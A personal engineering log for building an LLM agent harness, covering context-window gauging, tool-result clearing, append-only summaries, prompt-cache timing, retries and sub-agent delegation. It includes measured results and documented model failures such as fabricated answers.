# SRE-Gym build log

Running notes on building an agent harness from scratch → sandboxing → an RL environment.
Each entry: what I built, what broke, the number that proved it. Post material lives at the bottom.

**First X post planned: Friday 2026-10-09** (intro post — plan it then, not before).

---

## Week 1 — Agent loop from scratch (done 2026-10-07)

**Built:** `agent.py` — a raw while-loop agent (no framework) with 3 tools: `read_file`, `write_file` (fenced to the project dir with realpath), `run_bash` (y/n approval, 30s timeout, stdin=DEVNULL). Malformed tool-arg handling, JSONL transcript per turn.

**Findings:**
- Same task, two models. 550B model: read the file first, made a minimal 2-line fix, verified. 4B model: rewrote the file blind and once claimed success that never happened. → The harness must verify, never trust the model's "done".
- Error compounding is real: an early wrong write gets built on by every later step.
- Read Anthropic's *Building Effective Agents*: workflows (code decides) vs agents (model decides). Add complexity only when it pays.
- Codex source dive (`shell_spec.rs`): `cmd` is a string; commands run sandboxed by default, the *model* requests escalation with a justification, the *user* approves; `prefix_rule` approves by command prefix. The danger-checker parses argv but is not a security boundary — the sandbox is.

---

## Week 2 — Context engineering (in progress, started 2026-10-07)

### A. Token accounting
- Logged `usage` per turn: prompt tokens, completion tokens, delta.
- **Tool schemas = 67% of the prompt** on a short task (~340 tokens resent every single turn).
- After just 2 turns I had **paid for 1,032 prompt tokens while only 584 were in the window** (1.8×). The whole history is resent each turn → total cost grows ~quadratically with steps.
- Estimated vs real tokens differ by ~70–100: the chat template (Qwen wraps tools + messages in special markers and hidden tool-call instructions).

### B. The real context window
- Model card says qwen3:4b supports **262,144** tokens. My server was actually running **4,096**.
- `OLLAMA_CONTEXT_LENGTH=8192` on its own line did nothing — it's a shell variable, not exported. Must be on the same line as `ollama serve`.
- Overflowed on purpose: Ollama 0.32 does **not** silently truncate — it returns `400 exceed_context_size_error`. (Older versions dropped old messages silently.)
- `seq 1 4000` = **19,319 tokens**, not ~8k: Qwen tokenizes digits one per token. `len/4` is fine for prose, badly wrong for numbers/logs/hashes.

### C. Capping tool output
- One choke point: every tool result goes through `cap_tool_result` (budget = 15% of the model's window, derived per model, not hardcoded).
- Over budget → full output spilled to `.outputs/<call_id>.txt`, model gets head + tail + a marker telling it where the rest is and how to page it.
- `read_file` got `start_line`/`end_line` paging. Asked "what's on line 2000?" → the 4B model fetched exactly line 2000 (+77 tokens instead of 19k).
- **Output format changed correctness:** bash result was `exit → stdout → stderr`. Tail ended in `stderr:` noise and the 4B model picked the 2nd-to-last line (95764 instead of 13965). Reordered to `exit → stderr → stdout` → correct (3/4 runs).
- **The model narrowed the question:** "last number in the file" became "last number in the first 100 lines" — confident and wrong. Cause: example values (`eg 1,99`) in the tool schema anchored a tiny page.
- **Ablation:** removed schema examples only → 2/3 correct. Added a 27-token system prompt ("answer the question as asked; read the rest if you only saw part") → **8/8**. Removing it brought back the exact failure it targets.
- When an answer is knowable without tools (`seq 1 5000`), the model skips the tool entirely. → Every SRE-Gym task must require observing the environment.

### D. Compaction — part 1: the gauge (done 2026-10-09)
- Need "how full is the context?" **before** sending (after = already got the 400). But exact `prompt_tokens` only arrives after a call, and describes the previous request.
- Hybrid: `last prompt_tokens (exact) + estimate(messages added since the last call)`. Cut line = `len(messages)` saved right before `llm_call`. Fallback (step 0 / no usage) = estimate messages **+ tool schemas**.
- Result on BLUE-42: step 0 (pure estimate) 988 vs real 557 (**+77%**, safe side). Step 1 (hybrid) 2035 vs 2635 (**−23%**, digits again: new part est. 1478, real 2078).
- Hybrid's win: error is bounded to one turn's new messages and gets corrected by the next exact number — it never accumulates.
- Bugs hit while building it (none crashed, all silently wrong): `len(list)` counts items not chars; `(a // b) * 100` is always 0; `0` vs `None` meant the no-usage fallback never ran; `messages.extend(tools)` inside a *measuring* function mutated the real conversation.

### D. Compaction — part 2: clearing old tool results (first version 2026-10-09)
- Rule: over 70% → oldest-first, replace tool-result content with `[cleared - full result at .outputs/<id>.txt]`, keep last 4, stop at 35% (hysteresis: make each cache invalidation count) or when nothing is left to clear. Every result is now saved to `.outputs/` so clearing is restorable.
- Clear-to-target beats clear-all: cache break point is the same (oldest result) either way, so clearing more only loses evidence.
- Bugs on the way: `name : {...}` is a type annotation, not an assignment (NameError later); `[:N]` vs all-but-last-N; `[:len-N]` goes negative → `[:-1]` cleared recent results (3 results, N=4); a "within ±3" check comparing tokens to a percentage.
- **Test (8 log files, "max of each"): all 8 answers wrong.**
  - Model made 8 **parallel** tool calls → all results in one turn → gauge jumped to **119%** → clearing wiped results 1–4 **before the model ever saw them**. Model then mapped log5–8's numbers onto log1–4 and never followed the placeholder to `.outputs/`. → Only clear results the model has already been shown.
  - Per-result cap (15%) doesn't bound a batch: 8 × ~12% = 119%. → Need a per-turn budget too.
  - After clearing: estimated 6391, real **7962/8192** — 230 tokens from a 400. Digit under-count ate the safety margin.
  - log5–8 (never cleared) also wrong: a 4B model can't find a max over 300 numbers by eye. The test mixed a model failure with a harness failure → tasks must be checkable without mental arithmetic.

- **Fix: only clear results the model has seen** (`index < last_call_msg_len`). Re-ran the 8-log task expecting a loud 400. **Got silent truncation instead:** reported prompt 7597 (< 8192) for a prompt estimated at 9778 — smaller than the *cleared* version last run (7962). Model's first line: *"Since the user hasn't specified a particular task…"* → the oldest messages (system + task) were dropped server-side. It then invented stats (count 2294, real 2400).
  - Hypothesis (unverified — check `ollama serve` log for "truncating input prompt"): Ollama drops oldest messages when that's enough to fit; returns 400 only when it can't (step B: a single 19k message).
  - Lessons: never rely on the server to fail loudly — the harness must refuse to send an over-window request itself. When the server truncates, `usage.prompt_tokens` describes the truncated prompt, so the gauge's "exact" part lies. And the thing it dropped was the task — exactly what compaction must never lose.

- Third run of the same task (19:32): model paged **only lines 1–100** of each file despite `[lines 1-100 of 300]` headers and the "read the rest" system prompt → narrowing is back. 3/8 correct; also mixed up files again with nothing cleared (log5 got log6's first line). Peaked at 55% — clearing never triggered.
  - **Same task, 3 runs, 3 behaviours** (read all → cleared unseen; read all → truncated; read 1/3 → partial). Whether a mechanism fires depends on what the model chooses → a real-model task can't test harness mechanics.
  - **Guard added (2026-10-10):** after clearing, if the estimate is still > `hard_limit_percentage` (90% — leaves room for the ~20% digit under-count), print why and `break`. Never let the server decide what the model forgets. Bug on the way: `tokens_after_clear` only existed inside the clearing `if` → NameError on turn 0; fixed by overwriting one variable.
  - **Fake LLM built (2026-10-10):** `model_provider == "fake"` returns scripted replies (`usage=None` → gauge uses pure estimate). Script 1 (8 parallel reads): 9953/8192 (121.5%) → `Cleared: 9953 → 9953` (all unseen, nothing touched ✓) → guard stopped at 7372 limit ✓. Repeatable, no GPU.
  - Script 2 (8 replies × 1 read each): clearing correct — seen-only, last 4 kept, oldest first, skips already-cleared. **But design flaw:** it cleared one result per turn, every turn (82→96→98→99% before clearing, 85–89% after), never near the 35% target → cache invalidated every turn, the exact failure hysteresis was meant to prevent. Ended 100 tokens under the guard.
    - Cause: "keep last 4" counts *results*, the target is in *tokens*. 4 kept × ~1,100 tokens + 1 unseen ≈ 70% of an 8k window → target unreachable. Not a 4B issue — a window-size vs result-size mismatch; a fixed count can't fit 8k and 200k.
    - **Fix: keep by tokens, not count** — `keep_recent_percentage: 20` (walk seen results newest→oldest, keep while total ≤ 20% of window). 15% result cap < 20% keep budget ⇒ the newest seen result is always kept. Off-by-one on the way: `split = j` kept the result that crossed the budget; needed `j + 1` (slice end is exclusive).
    - Re-run of script 2: **2 clearing passes instead of 4** (3 results, then 2), peak after clearing 52% (was 89%), ended at 62% (was 100 tokens from the guard).
    - Still can't reach 35% on 8k: floor = base ~12% + kept ≤20% + newest unseen ≤15% ≈ 50%. On a 200k window the same percentages leave a ~5% floor. Accepted for now; per-model `keep_recent_percentage` if needed.
  - Plan: test mechanics with a scripted **fake LLM** (fixed tool calls, fully repeatable); test model behaviour separately with n>1 real runs.

### D. Compaction — part 3: LLM summary (built 2026-10-10)
- Trigger: after clearing, **still ≥ 70%** → summarize (the expensive step only when the cheap one failed). Guard at 90% stays last.
- Cut = earliest **assistant** message whose tail fits the 20% keep budget; none fits → last assistant message (latest turn always kept whole); cut ≤ 2 → nothing to summarize. Cutting before an assistant message means a tool call always travels with all its results.
- Summary call: no `tools` (so it can't answer with a tool call), old middle sent as `json.dumps` transcript in one user message (keeps roles, tool_calls, ids; sidesteps pairing rules). Prompt asks for progress, findings with exact values + `.outputs/` paths, failures/ruled-out, what's left. Rebuilt as `system + task (verbatim) + "[Summary of earlier work]" + recent`.
- A summary helps with a **long history**, not one **huge turn** (8-parallel case: cut = None, guard catches it).
- Bugs on the way: joining `msg["content"]` crashes on `None` (tool-call messages) and drops roles/ids; `llm_call` returns a 4-tuple; `messages[2:None]` = everything (would summarize the unseen turn); rebuild first dropped `messages[cut:]`; "nothing to summarize" returned a string that replaced the whole history.
- Fake test (long assistant reasoning + tiny reads, so clearing can't help): 74.6% → clear does nothing → summary → 54%, repeating every 2 turns. All 9 requests checked: no orphaned tool results, task always at index 1, summary #2 absorbs summary #1.
  - Every 2 turns = extra LLM call + full cache miss each time (big turns vs 8k window again). Summary-of-summary drift: early details fade each round — one reason Codex keeps user messages verbatim.
  - Two `user` messages in a row (task, summary) — fine on OpenAI-compatible APIs, not on APIs that require alternation.

- **Real summarizer on a fake history** (agent = fake script with exact `FINDING` values, summary = real qwen3:4b; `llm_call(provider=...)` + `SUMMARY_PROVIDER` split agent model from summary model):
  - Summary 1: all 3 findings exact, all sections present. But "what's left" was **guessed** ("read lines 21–300 of log1–3", nothing about log4–8) — the summarizer never sees the task (`messages[1]` isn't in `messages[2:cut]`).
  - Summary 2: **not a summary** — the model output a JSON list, a mangled copy of its input (tool results merged into assistant messages, previous summary nested, label doubled). The 4B model copied the input's format instead of following the system prompt. Values survived only because it copied them; next estimate 63%, not ~50%.
  - Fixes planned: instruction **after** the transcript (recency), give the summarizer the task as context, and **validate** the summary (reject if too long or starts with `[`/`{` → keep history, let the guard decide). A bad summary must never replace real history. Then n≥3 runs.

  - **Fix 1 (instruction after a fenced transcript), n=3:** 6/6 real plain-text summaries (was 1/2), values exact for the files covered.
  - **But summary 2 dropped log1–3's findings in 3/3 runs** — summary 1 was in its input (`messages[2]`), the model ignored it. Predicted "gradual drift", got total loss in one step. End state: agent knows 3/8 answers + recent turns; would silently get log1–3 wrong.
  - "What's left" still guessed in 6/6 ("read lines 21–300 of these three files", never knows there are 8) — fix 2 (give it the task) not done yet.
  - Planned fix: **append-only summaries** — keep earlier summaries verbatim, summarize only the turns since the last compaction, append. Harness guarantees the facts survive instead of hoping the model carries them.

  - **Append-only summaries + task given to summarizer, n=3:** log1–3 findings kept 3/3 (was 0/3), log4–6 exact 3/3, plain text 6/6, "what's left" correct 5/6 (was 0/6).
    - The 1 miss: new-part summarizer saw only task + turns 4–6, so it wrote "log1–3 have not been processed" right under the frozen part listing their values — a self-contradicting summary (cost: wasted re-reads, not wrong answers). Fix: pass the old summary as **read-only context** (see it, don't rewrite it).
    - Costs: summary grows (post-compaction ~56–57% vs ~50%); stale "next steps" from older summaries stay frozen — later refinement: freeze findings only.
    - Bugs on the way: `None.startswith` on a tool-call assistant message (fake never hits it — fakes only test what you put in them); `a and b or "".startswith(x)` = `(a and b) or False` → label check was dead code (`.startswith` ran on the literal `""`); passing the task dict instead of its content.

### D. Compaction — part 4: compared with Codex `compact.rs` (2026-10-10)
Read `codex-rs/core/src/compact.rs` + `prompts/templates/compact/{prompt,summary_prefix}.md`.
- **Summarizer input:** full real history + the compact prompt appended as one more user message → identical prefix = cache hit. Mine: `json.dumps(old)` in one message → cache miss, and it caused the JSON echo.
- **Overflow during the summary call:** drop the oldest item, retry, `error!` log; give up only at 1 item. OK (unlike Ollama's silent drop) because only the *summarizer* loses it — user messages are re-collected from a fresh, untrimmed copy.
- **After compaction keeps only:** user messages verbatim (≤ `COMPACT_USER_MESSAGE_MAX_TOKENS = 20_000`, walked newest→oldest, the crossing message truncated not dropped) + session context + prefix + summary. **No assistant msgs, no tool results, no tail.** → context lands very low, compacts rarely. Cost: oldest user message (often the task) is first to go in a long session.
- **Why user messages verbatim:** the user's exact instructions are never left to the summarizer to paraphrase/drop (my summary-of-summary failure).
- **Prefix paragraph** tells the post-compaction model who wrote the summary and to "avoid duplicating work" (no re-running tools); also the marker used to find summaries.
- **Old summaries** are filtered out of the kept user messages and re-summarized — exactly my first design, which my 4B model failed. Trust in the model decides it.
- **My append-only cost:** grows without bound → eventually the summary alone fills the window and must be summarized anyway; frozen text can't be corrected (run-3 contradiction).

### E. Prompt caching (started 2026-10-10)
- **Probe on Ollama 0.32.5, qwen3:4b, ~4.7k-token prompt (native `/api/chat` `prompt_eval_duration`):** cold 4,469 ms · same prompt again 30 ms · +14 tokens appended 93 ms · **+8 tokens in the system prompt 4,453 ms** (= cold).
  - `usage.prompt_tokens` always reports the FULL count, cached or not → the gauge was never skewed by caching.
  - Ollama `/v1` usage has only prompt/completion/total — **no `cached_tokens`**; cache is visible only as time. OpenAI/OpenRouter: `usage.prompt_tokens_details.cached_tokens`.
- Rules: nothing dynamic at the start of the prompt · append, don't edit · when the prefix must break (clearing oldest results = the most expensive spot), break it rarely and big → hysteresis to 35%.
- Harness: timer around `llm_call` only + `event` (clear/compact) per step. Typo `prompt_token_details` would have been silently `None` forever — `.get() or {}` hides typos; print raw usage once.
- **First real-model run (also task2), 2026-10-11:** model ignored "one by one", made **8 parallel read_file calls** in step 0 → 8 × ~1.1k tokens, each under the 15% cap, sum = 119% of the window. Clearing 9778→9778 (all unseen — correct), summary "nothing to summarize" (correct), guard stopped at 10204 > 7372 (correct). Every mechanism right, run dead → **per-turn budget** needed (big models parallelize more, not less).
  - Step 0's 6,960 ms includes loading weights (model wasn't loaded) — not a cache number; warm up first.

- **Per-turn budget** (2026-10-11): budget = max(room before 70%, 20% of window); results in call order, full or placeholder (`.outputs/<id>.txt`), never shrunk — partial data = confident wrong answer (post 9). Bugs: percentages not /100 (budget ~573k), flag set in the "fits" branch (only 1st result shown), flag never reset per turn (livelock), print before the decision (misleading).
  - Run: 5/8 shown, but gauge said 84.6% vs budget target 70% → **unit mismatch**: budget measured raw content, gauge measures `json.dumps` (`\n` → 2 chars, +17%). Fixed: measure `json.dumps(res)`.
- **Calibration attempt — failed, instructive:** ratio = real `prompt_tokens` / raw estimate, applied inside `estimate_tokens`. Trap hit first: computing the "raw" estimate with the calibrated function → ratio oscillates 1.12 / 1.00. After fixing: step-0 ratio **0.56** (schemas + prose), then all 8 files allowed (est. shrunk ×0.56), real 7597.
  - Measured directly: one log file = **1,767 real tokens vs 1,032 estimated (ratio 1.71)**. 8 files ≈ 14.7k real in an 8k window → **server truncated in both budget runs**; the "what task?" replies were truncation, not context rot (I called it context rot from the truncated usage numbers — wrong).
  - Lessons: a ratio measured on one kind of content (prose 0.56) does not transfer to another (digits 1.71) · never calibrate from a response that may have been truncated (`usage` describes the truncated prompt) · **every mechanism (cap, budget, gauge, guard) is only as good as the counter** — a log file is really 21% of the window, the 15% cap never fired.
  - Next: drop the global ratio; real tokenizer per model in `model_config`; conservative fallback (errs high) for unknown models.

### Real tokenizer per model (2026-10-11)
- `model_config` values are now dicts: `context_window` + optional `tokenizer` (Qwen3 `tokenizer.json` via HF `tokenizers`, cached, path resolved from `agent.py`'s dir because the agent runs from `task1/`).
- Fallback for models without a tokenizer = `len(text)` (1 token/char) — never under-counts, even on digits; costs ~3.4× over on code (app.py 224 chars = 66 real). Fine for a 1M window, wasteful for a small one.
- Calibration (`token_ratio`) deleted. Cap cut now uses the text's own ratio `len(text)/real_tokens` instead of the constant 2 (old cut was ~2× over budget on digit logs).
- Verified: log1.txt (pure digits, 1,762 chars) → old `len/2` 881, real **1,762** raw / 1,764 as `json.dumps`; Ollama had reported 1,767 (the ~3-5 extra = chat template tokens). `json.dumps` escaping adds tokens → errs high (safe).
- NixOS gotcha: `tokenizers` wheel needs `libstdc++.so.6` → `nix-build '<nixpkgs>' -A stdenv.cc.cc.lib -o .gcc-lib` (creates `.gcc-lib-lib`, nix appends the output name!) + LD_LIBRARY_PATH export in `.venv/bin/activate`.

### E. Replay results (2026-10-11)
`replay.py` resends one logged run's requests to Ollama native `/api/chat` with `num_predict:1` and reads `prompt_eval_duration` (prompt-only time). Native API needs `tool_calls[].function.arguments` as an object, not the OpenAI JSON string (rebuild with `{**c, ...}` — a shallow `dict(m)` copy + in-place edit would mutate the log and break the prefix comparison). Cold start forced by unloading the model (`/api/generate` with `keep_alive:0`; `ollama` isn't on PATH outside the nix-shell).

Fake-LLM run 1791657564 (9 steps, no tool schemas, small prompts):
| step | prompt tok | eval ms | same-prefix msgs | event |
|---|---|---|---|---|
| 1–3 | 518 → 1433 | 281–293 | n-2 / n | append (~460 new tok each) |
| 4 | 843 | **473** | **2/5** | clearing/compaction |
| 5–6 | 1299 → 1758 | 292–302 | n-2 / n | append |
| 7 | 1222 | **507** | **2/5** | clearing/compaction |
- Append cost tracks the **new** tokens, not the total: ~290 ms whether the prompt is 518 or 1,758 tokens (~1,600 tok/s).
- Prefix-breaking steps recompute everything after system+user: ~1.7× slower here even though the prompt got *shorter*. Small here because the prompts are small; at a full 8k prompt with schemas it's the probe's ~4.4 s.
- First real-run replay looked 'all cached' (34/28 ms) — the cache was warm from an earlier send; always unload before measuring.
- Confirms the rules: append-only, and compact rarely and by a lot (hysteresis 70% → 35%).

### task2 final runs (2026-10-11, real tokenizer)
- Run A: 8 parallel reads, budget showed 7/8, gauge 70.6% → clearing (nothing seen) → "nothing to summarize" → next LLM call **hung 120 s → httpx.ReadTimeout traceback**. No `max_tokens` in the request → most likely runaway generation. Harness gaps: no output budget (window must hold prompt + reply), timeout = raw crash.
- Run B (same code): 4/8 shown, peak gauge 71.9% (estimate 5,890 vs real 5,240 → errs ~12% high = safe side), model answered in step 1.
  - Harness verdict: under limit ✓ · task kept ✓ · everything hidden was marked ✓ (the model even said "estimates based on partial visibility").
  - Model verdict: **2/8 correct** (log1, log3). log2/log4 shown but the max was in the truncated middle (said 99673/99189, real 99949/99981). log5–8 were placeholders and it **invented** values — log8's "99981" is log4's real max. It stopped instead of calling the tools again.
  - Lesson: a correct harness doesn't make a correct answer. Marking hidden data isn't enough; the outcome needs a **verifier** that checks against ground truth (= SRE-Gym phase 3). True maxima: 99809 99949 99305 99981 99846 99553 99865 99413.

- Runs C + D (same code, 2026-10-11):
  - C: 7/8 shown, answered at step 1 → **0/8** correct (said "first 100 lines" — the narrowing failure is back when content is truncated; log7 got log6's real max).
  - D: 7/8 shown → model re-read the hidden log8 (good) → gauge 80.2% → **clearing 6569 → 3738** (old results replaced by `.outputs/` pointers) → 2 more reads → clearing again at 73.2% → final answer **1/8** (only log8, the one just read), the rest invented (99999 ×4, 15000, 98765), ending with "✅ All files have been analyzed completely and the results are accurate." It cited the `.outputs/` paths from the clearing markers but never read them.
  - Harness checks still all ✓ (peak 80.2%, guard never needed, task kept, everything hidden was marked).
  - **Mechanism finding (model-agnostic): "seen" ≠ "recorded".** Seen-only clearing assumes the model already pulled what it needed out of a result. For aggregate tasks (one fact per file, answer at the end) the facts lived only in the cleared results, and the LLM summary never ran because clearing alone got under 70%. Fix idea for later: record findings before clearing (summary/notes pass first, or a scratchpad tool the model writes to). Clearing also landed at 45.6%, not the 35% target (keep-recent 20% protects the newest results).
  - Model score over 3 completed runs: 2/8, 0/8, 1/8. Week-1 lesson repeats: the 4B claims success it didn't earn → verifier.

- **Output budget added (2026-10-11):** `max_output_tokens` per model in `model_config` (qwen 800 = the 10% the 90% guard leaves; nemotron 32,000), sent as `max_tokens` in all 4 request bodies. Rule: prompt + reply ≤ window. A `finish_reason == "length"` reply only prints a warning today → it must never count as a final answer (fix with week-3 retries).
- Run E (with max_tokens): no hang ✓. Model chose `start_line 1, end_line 10` for all 8 files (906 tokens total, 8/8 shown, 25% gauge); the harness marked each one `[lines 1-10 of N]` ✓ — the model answered anyway → **0/8**. Same prompt, same code, 5 runs, 5 different strategies (8 full reads / re-read / paging / give up) → **one run proves nothing about a model; evaluate over many rollouts** (= why RL envs run N rollouts per task).
- **Week 2 Learn + Build done 2026-10-11 — NOT closed:** the roadmap card's *Done when* is still open: (1) a 50+ step task finishes without blowing context (longest real run so far = 5 steps, fake = 9), (2) a cost-per-task chart exists. Harness held across every run: never over the window, never lost the task, always marked what it hid. Model accuracy across runs: 2/8, 0/8, 1/8, 0/8.

### Done-when: 55-step chain + cost chart (2026-10-11)
- Fixture `task_chain/`: 55 files (~628 tok each, digit-noise logs), each names the next on line 1, last has `FINAL CODE`. Total 34.5k tok = 4.2× the window. Answer key outside the folder.
- Real 4B: quit 4/4 runs at hop 7–12 (read lines 1–5 and missed the `next:` line; once invented "200" from `status=200`; after `next:` moved to line 1 it still said "no FINAL CODE" at hop 7). Not a harness failure → used a **reactive fake LLM** (`FAKE_MODE="chain"`: follows the newest *visible* tool result, errors loudly if clearing/compaction ever drops it).
- Also found on the way: `FAKE_SCRIPT` was built at import and opened `log*.txt` from the CWD (crashed any run outside `task1/`) → built lazily; the week-1 20-step cap → `MAX_STEPS` config; `read_file` error now says the values and the way out ("omit end_line").
- **Fake chain run: 56 steps, `The final code is KESTREL-4471` ✓, no guard stop, no FAKE ERROR.** 22 clears + 1 compaction. Peak prompt *sent* 70% (gauge peaked 78% before clearing). → **Done-when 1 PASSED.**
- **Cost chart** (`cost_chart.py` → `task_chain/cost_chart.html`, Qwen tokenizer on each logged request + tool schemas): paid **254,560** prompt tokens vs **1,119,996** if nothing were removed (4.4×); without removal the prompt passes the window at step 11 and ends at 39.5k (4.8× window). → **Done-when 2 PASSED.**
- Findings:
  - **Rising floor:** each clear lands higher (3097 → 3470 → 3856 → … → 5774) — cleared markers + the assistant tool-call messages stay. Clearing alone can't sustain a long task; compaction is required.
  - **Clear-every-step thrash** (steps ~30–35 and ~51–55): clearing frees one result (~600 tok) and lands just under 70%, so it fires again next step — every step breaks the prompt prefix (E: ~1.7×+ prompt cost each). Fix idea: compact when clearing can't reach the 35% target (or a "floor too high" check), not only when it can't reach 70%.
  - **The summary lied:** at hop 34 the 4B summary said "Completed the full chain… the final file contained the FINAL CODE line" and pasted a whole log file. The fake ignores summaries, so the run survived; a real model reading that summary would likely have answered and stopped. Summaries need validation, and `[Summary]` text is the least trustworthy thing in context.
- **WEEK 2 CLOSED 2026-10-11** — Learn ✓ Build ✓ Done-when ✓ (both card criteria).

### Left this week
Status 2026-10-11: **WEEK 2 CLOSED (Learn, Build, Done-when all ✓)** — calendar week 2 only starts 10-11, so ahead of schedule. Plan agreed: timebox the rest, new findings go to the open list, not into this week.
- [x] D. Compaction (clear old tool results → LLM summary; never split tool_call from its result; never lose the task)
  - [x] D1 gauge · [x] D2 clearing (seen-only) · [x] guard (refuse to send > 90%)
  - [x] fake LLM for repeatable mechanism tests (added 2026-10-10, not in original plan) + keep-by-tokens fix
  - [x] D3 LLM summary (append-only, task-aware, fake-driven real-summarizer tests n=3)
  - [x] per-turn budget for parallel tool results (2026-10-11, found by the first real run)
- [x] real tokenizer per model (done 2026-10-11, see note above) — was: (one session max) — drop the global `token_ratio` (keep `raw_estimate_tokens` or delete), add a tokenizer entry to `model_config` (Qwen3 `tokenizer.json` via the `tokenizers` lib), conservative fallback (errs high) for models without one. Then the 15% cap / budget / guard work on real numbers.
- [x] E. Prompt caching — [x] probe (cold 4469 / same 30 / +14 appended 93 / +8 in system prompt 4453 ms) · [x] harness timer + event + `cached_tokens` field · [x] replay script (done 2026-10-11, see note above): replay logged requests from `transcript.jsonl` into Ollama native `/api/chat`, read `prompt_eval_duration` (harness `elapsed_ms` is dominated by generation, can't isolate cache)
- [x] **Done-when (roadmap card):** 50+ step task finished (56 steps, fake chain) · cost-per-task chart exists (`cost_chart.py`) — 2026-10-11
- [x] task2 — PASSED on harness criteria 2026-10-11 (see note above). Was: attempted twice (both runs exposed harness gaps: per-turn budget, counter). One final real run after the tokenizer; **judge the harness, not the model** (stays under limit, never loses the task, fails loudly).
- [x] Reading: Anthropic *Effective context engineering*, Manus *Context Engineering lessons* (done 2026-10-09; Chroma *Context Rot* deferred)
- [x] Codex `compact.rs` questions (done 2026-10-10, see part 4)
- Optional / later: D3 read-only old-summary fix · F Agent class refactor · Chroma *Context Rot* · append-only summary cap

---

## Week 3 — sub-agents, MCP, permissions (started 2026-10-13)

### Carry-in 1: retries + clean failure (done 2026-10-13)
- `post_with_retries`: timeout / connect error / 408 425 429 5xx → retry (4 attempts, backoff 1·2·4 s); any other status → `LLMError` at once (a 400 like context overflow fails the same way every time).
- `Retry-After` **replaces** the backoff (the server's real number beats our guess; adding wastes time), digits only, >60 s falls back to backoff.
- `llm_call` raises `LLMError` instead of `sys.exit` → the main loop logs `{"step", "error"}` and ends. Needed so a 10-task eval records "task 4 failed" and moves on.
- Bugs caught in review: `response` unbound/stale after a timeout (first-attempt crash, or obeying an old 429's header); header used as a string in `time.sleep`; error log reusing the previous step's request/reply (a lying transcript) or NameError at step 0.
- Tested on a scratch copy against a fake HTTP server: 9/9 paths (incl. timeout-first, stale header, step-0 400 → clean one-line transcript).

### Carry-in 2: length-cut reply ≠ final answer (done 2026-10-14)
- `finish_reason == "length"` with no tool calls → keep the partial reply, add "cut off, reply again shorter", retry. 3 cuts **in a row** → `outcome = "LENGTH"`. Counter resets on a normal reply (consecutive = stuck; a total would punish long tasks).
- Every exit sets `outcome`: ANSWERED / LENGTH / LLM_ERROR / HARD_LIMITED / STEP_CAP — the field the eval will count.
- Fake-server tests: cut,cut,ok → ANSWERED · cut×3 → LENGTH · cut,cut,tool,cut,cut,ok → ANSWERED (reset works); all cut replies logged with usage.
- **Found while testing:** `run_bash` asks `Run this? (y/n)` via `input()` → in any unattended run (eval, sub-agent) it dies with `EOFError`. The permissions item must give a non-interactive mode (ask → deny, or a policy file).

### Chunk 3: Agent class refactor (started 2026-10-14)
- Traced the model dependency with `ast`: `model_provider` reaches **9** functions, not 2 (gauge, clearing, compaction cut, tool cap all read it via `get_model_config` → `estimate_tokens`). Two agents on different models would silently count with the wrong tokenizer/window. Plan: one `cfg` dict per model (provider, url, model id, window, tokenizer, max_output) passed explicitly; delete the globals. "Swap models with one flag" = pick a config key.
- Rule: count tokens with the cfg of **whoever receives them**. Kept tail → agent's cfg; middle sent to the summarizer → summarizer's cfg.
- **Open bug found:** nothing checks the summarize request against the *summarizer's* window. Agent on nemotron (1M) compacts at ~700k → whole middle sent to an 8k qwen summarizer → 400 or silent truncation. Needs chunked summarizing or a loud fail.
- **cfg threading done 2026-10-15.** `model_config` keyed by name (provider/url/model/window/tokenizer/max_output), `"fake"` = qwen numbers + fake provider; `get_model_config`/`get_model_context`/`model_provider`/`SUMMARY_PROVIDER` deleted; `llm_call` has no model names, only `if provider == "openrouter": add key`.
  - Review catches: `cfg` never defined (compiles fine — py_compile only checks syntax); `llm_call(request, cfg, SUMMARY_PROVIDER)` put "local" into the `tools` slot (positional args landing in the wrong slot); `summarize_cfg` vs `summary_cfg` typo would crash only at step ~36 (first compaction); post-compaction count used `summary_cfg` (wrong receiver — invisible while both are qwen numbers).
  - **Regression (fake chain, scratch copy):** steps 0–35 byte-identical to the old run, compaction at the same step + same cut (72→7), all 56 replies identical, ANSWERED KESTREL-4471. Only diff: summary text (FAKE vs real qwen) → 19 clears vs 22 after it. Lesson: when a refactor changes a number, find the first diverging step before calling it broken.
- **Agent class done 2026-10-15.** State in `self`, `run(task)` returns `{outcome, answer, steps, prompt_tokens, completion_tokens}`, `__main__` guard so `eval.py` can import it. Review catches: loop still read the global `cfg` (would run nemotron with qwen's 8k window — the exact bug the refactor targets; only deleting the global exposes it); `LLMError(msg)` without `raise` → would `sleep(3600)`; leftover module-level prints = NameError on import.
  - Regression: identical to the cfg-refactor run (56 calls, 19 clears, 1 compaction, ANSWERED KESTREL-4471). `steps` = tool turns (55), not LLM calls (56).
  - **Two agents in one process:** agent 1 correct, agent 2 `FAKE ERROR: lost the chain` at step 0 — the fake's global `chain_call_n` leaked. Fix: derive "first call" from the messages (no assistant msg yet), not a counter.
  - **outcome ≠ success:** agent 2 was `ANSWERED` with a wrong answer. The eval needs a per-task grader against an answer key, not "the agent stopped".

### Week 3 status (authoritative — read first after a compaction) — 2026-10-15
- [x] 1 retries + clean failure (`post_with_retries`, `LLMError`, Retry-After, >60 s raises)
- [x] 2 length-cut ≠ final answer (3 in a row → LENGTH) + `outcome` on every exit
- [x] 3 `cfg` threading + `Agent(model_name, summary_model_name).run(task)` → dict; `__main__` guard; fake "first call" derived from messages (counter kept only for unique ids — `len(messages)` ids would collide after compaction)
- [x] 4 planner + worker sub-agents — DONE 2026-10-17 (fake-tested + real qwen run ANSWERED). Transcript lines carry `role` + `parent_run_id` + `parent_step` (child points to parent, like ppid); `run_id` = uuid4. Per-agent `self.tools` (planner = `DELEGATE_TOOL`, worker = `WORKER_TOOLS` default); `count_context_tokens` counts the agent's own tools; `llm_call(tools=None)` (no hidden default). `delegate` branch in `call_tools(..., parent)`: refuses unless `parent.role == "planner"`; a failed worker returns "Worker failed (OUTCOME) after N steps" instead of the string "None".
  - Fake-planner tests (scratch `test_subagents.py`): chain → planner 1 step / 2 lines, worker 56 lines all linked to planner step 0, KESTREL-4471 ✓; worker LLM_ERROR → planner sees "Worker failed (LLM_ERROR)" ✓; worker emits a hallucinated `delegate` → refused ✓.
  - Lessons: a fake only tests what it reads (tools=None passed the chain because the fake ignores tools); a shadowed name (`tools` param vs global) defeats the fallback; schema = what the model is told, `call_tools` = what is enforced → need both; fresh worker contexts mean NO context guard ever stops runaway delegation depth.
  - 2026-10-17: default role → `"solo"` (solo agent's hallucinated delegate refused ✓); worker tokens rolled into the planner's totals in the delegate branch (parent collects, like wait()) — fake with usage 100/10 per call: 2 planner + 56 worker calls → 5800/580 = expected ✓; solo chain regression unchanged ✓.
